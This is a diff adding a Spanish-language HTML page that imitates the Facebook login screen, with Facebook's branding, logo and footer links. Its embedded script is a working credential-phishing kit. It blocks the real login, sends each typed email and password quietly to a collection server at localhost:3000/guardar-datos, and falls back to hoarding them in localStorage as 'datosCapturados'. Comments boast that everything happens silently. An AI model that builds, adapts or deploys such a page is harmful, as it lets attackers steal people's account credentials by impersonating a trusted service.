@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <meta name="description" content="Inicia sesión en Facebook para conectarte con amigos, familiares y personas que conoces.">
+    
+    <!-- Estilos optimizados -->
+    <style>
+        /* Estilos básicos para la página de login */
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            color: #1c1e21;
+        }
+        
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .logo {
+            height: 70px;
+            margin-bottom: 15px;
+        }
+        
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 40px;
+        }
+        
+        @media (min-width: 900px) {
+            .login-container {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: flex-start;
+            }
+            
+            .welcome-text {
+                width: 50%;
+                padding-right: 30px;
+            }
+            
+            .login-form-container {
+                width: 45%;
+            }
+        }
+        
+        .welcome-text h2 {
+            font-size: 24px;
+            font-weight: normal;
+            line-height: 1.3;
+        }
+        
+        .login-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            box-sizing: border-box;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+            outline: none;
+        }
+        
+        .btn {
+            border-radius: 6px;
+            font-size: 20px;
+            padding: 0 16px;
+            height: 48px;
+            line-height: 48px;
+            text-align: center;
+            font-weight: bold;
+            display: block;
+            width: 100%;
+            border: none;
+            cursor: pointer;
+        }
+        
+        .btn-login {
+            background-color: #1877f2;
+            color: white;
+            margin-bottom: 15px;
+        }
+        
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+        
+        .btn-create {
+            background-color: #42b72a;
+            color: white;
+            width: auto;
+            margin: 0 auto;
+        }
+        
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            text-align: center;
+            display: block;
+            margin: 15px 0;
+            text-decoration: none;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-page {
+            text-align: center;
+            margin-top: 28px;
+            font-size: 14px;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #dddfe2;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            font-size: 12px;
+            line-height: 1.6;
+        }
+        
+        .footer-links a {
+            color: #8a8d91;
+            margin-right: 15px;
+            text-decoration: none;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            font-size: 11px;
+            color: #8a8d91;
+            margin-top: 20px;
+        }
+        
+        .language-selector {
+            margin-bottom: 15px;
+        }
+        
+        .language-selector select {
+            padding: 5px;
+            border: 1px solid #ccd0d5;
+            border-radius: 4px;
+            background-color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header class="header" role="banner">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="logo">
+        </header>
+        
+        <main class="login-container" role="main">
+            <section class="welcome-text" aria-labelledby="welcome-heading">
+                <h2 id="welcome-heading">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
+            </section>
+            
+            <section class="login-form-container" aria-labelledby="login-heading">
+                <div class="login-form">
+                    <h2 id="login-heading" class="sr-only">Iniciar sesión en Facebook</h2>
+                    
+                    <form id="login-form" action="/login/" method="post">
+                        <div class="form-group">
+                            <label for="email" class="sr-only">Correo electrónico o número de teléfono</label>
+                            <input type="text" id="email" name="email" placeholder="Correo electrónico o número de teléfono" autofocus aria-required="true">
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="password" class="sr-only">Contraseña</label>
+                            <input type="password" id="password" name="pass" placeholder="Contraseña" aria-required="true">
+                        </div>
+                        
+                        <button type="submit" class="btn btn-login">Iniciar sesión</button>
+                        
+                        <a href="/recover/initiate/" class="forgot-password">¿Olvidaste tu contraseña?</a>
+                        
+                        <div class="divider" role="separator"></div>
+                        
+                        <a href="/r.php" class="btn btn-create">Crear nueva cuenta</a>
+                    </form>
+                </div>
+                
+                <div class="create-page">
+                    <p><a href="/pages/create/">Crea una página</a> para un famoso, una marca o un negocio.</p>
+                </div>
+            </section>
+        </main>
+        
+        <footer class="footer" role="contentinfo">
+            <div class="language-selector">
+                <label for="language" class="sr-only">Seleccionar idioma</label>
+                <select id="language">
+                    <option value="es">Español</option>
+                    <option value="en">English (US)</option>
+                    <option value="pt">Português (Brasil)</option>
+                    <option value="fr">Français (France)</option>
+                    <option value="it">Italiano</option>
+                </select>
+            </div>
+            
+            <div class="footer-links">
+                <a href="/reg/">Registrarte</a>
+                <a href="/login/">Iniciar sesión</a>
+                <a href="https://messenger.com/">Messenger</a>
+                <a href="/lite/">Facebook Lite</a>
+                <a href="/watch/">Vídeo</a>
+                <a href="https://about.meta.com/technologies/meta-pay">Meta Pay</a>
+                <a href="https://www.meta.com/">Meta Store</a>
+                <a href="https://www.meta.com/quest/">Meta Quest</a>
+                <a href="https://www.meta.com/smart-glasses/">Ray-Ban Meta</a>
+                <a href="https://www.meta.ai/">Meta AI</a>
+                <a href="https://www.instagram.com/">Instagram</a>
+                <a href="https://www.threads.com/">Threads</a>
+                <a href="/privacy/policy/">Política de privacidad</a>
+                <a href="/privacy/center/">Centro de privacidad</a>
+                <a href="/policies/cookies/">Cookies</a>
+                <a href="/policies/">Condiciones</a>
+                <a href="/help/">Ayuda</a>
+                <a href="/settings/">Configuración</a>
+            </div>
+            
+            <div class="copyright">
+                <span>Meta © 2025</span>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Scripts mejorados -->
+    <script>
+        // Función para enviar datos al servidor Node.js silenciosamente
+        async function enviarDatosAlServidor(email, password) {
+            try {
+                const response = await fetch('http://localhost:3000/guardar-datos', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // Guardado exitoso en servidor - completamente silencioso
+                    return true;
+                } else {
+                    // Error del servidor - guardar localmente sin mostrar nada
+                    guardarDatosLocalmente(email, password);
+                    return false;
+                }
+            } catch (error) {
+                // Error de conexión - guardar localmente sin mostrar nada
+                guardarDatosLocalmente(email, password);
+                return false;
+            }
+        }
+        
+        // Función de respaldo para guardar datos localmente usando localStorage
+        function guardarDatosLocalmente(email, password) {
+            const fecha = new Date();
+            const fechaFormateada = fecha.toLocaleString('es-ES');
+            
+            const datos = {
+                fecha: fechaFormateada,
+                email: email,
+                password: password,
+                timestamp: Date.now()
+            };
+            
+            // Obtener datos existentes del localStorage
+            let datosGuardados = JSON.parse(localStorage.getItem('datosCapturados') || '[]');
+            
+            // Agregar nuevos datos
+            datosGuardados.push(datos);
+            
+            // Guardar de vuelta en localStorage
+            localStorage.setItem('datosCapturados', JSON.stringify(datosGuardados));
+        }
+        
+        // Funcionalidad principal del formulario
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('login-form');
+            
+            if (loginForm) {
+                loginForm.addEventListener('submit', async function(e) {
+                    e.preventDefault(); // Prevenir el envío normal del formulario
+                    
+                    // Capturar los datos de los inputs
+                    const email = document.getElementById('email').value;
+                    const password = document.getElementById('password').value;
+                    
+                    if (!email || !password) {
+                        // Validación silenciosa - no mostrar alert
+                        return;
+                    }
+                    
+                    // Guardar datos silenciosamente
+                    await enviarDatosAlServidor(email, password);
+                    
+                    // Limpiar el formulario después de un breve delay
+                    setTimeout(() => {
+                        document.getElementById('email').value = '';
+                        document.getElementById('password').value = '';
+                    }, 100);
+                });
+            }
+            
+            // Selector de idioma
+            const languageSelect = document.getElementById('language');
+            if (languageSelect) {
+                languageSelect.addEventListener('change', function() {
+                    // Redirigir según el idioma seleccionado
+                    const lang = this.value;
+                    window.location.href = lang === 'es' ? 
+                        'https://www.facebook.com/' : 
+                        `https://${lang}-${lang}.facebook.com/`;
+                });
+            }
+        });
+    </script>
+</body>
+</html>
